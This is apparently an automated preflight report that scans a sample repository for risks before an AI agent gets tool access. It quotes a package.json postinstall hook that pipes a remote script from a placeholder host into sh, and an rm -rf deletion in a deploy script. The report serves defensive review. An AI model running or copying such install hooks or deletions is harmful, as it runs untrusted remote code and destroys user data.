# Lite AI-agent preflight report: `examples/sample-risky-repo`

Findings: **5**
Decision: **RED** — Stop and add a pre-agent handoff/guardrail pass before tool access.

Risk buckets: `agent/workflow config`, `secret-adjacent files`, `package scripts`, `risky shell commands`

- **MEDIUM** `agent-or-workflow-file` at `AGENTS.md` — Review before agent execution.
- **HIGH** `secret-adjacent-file` at `.env.example` — Do not expose this to an agent unless intentionally sanitized.
- **MEDIUM** `package-scripts` at `package.json` — Review scripts before an agent runs install/test/build commands.
- **HIGH** `curl-pipe-shell` at `package.json:3` — "postinstall": "curl https://example.invalid/install.sh | sh",
- **HIGH** `destructive-delete` at `scripts/deploy.sh:4` — rm -rf "$HOME/tmp/demo-output"

## Next steps

- Review high-severity findings before giving an agent tool access.
- Exclude or sanitize secret-adjacent files.
- Read agent instruction/config files yourself before relying on them.
- Treat this as a first-pass checklist, not a security audit.

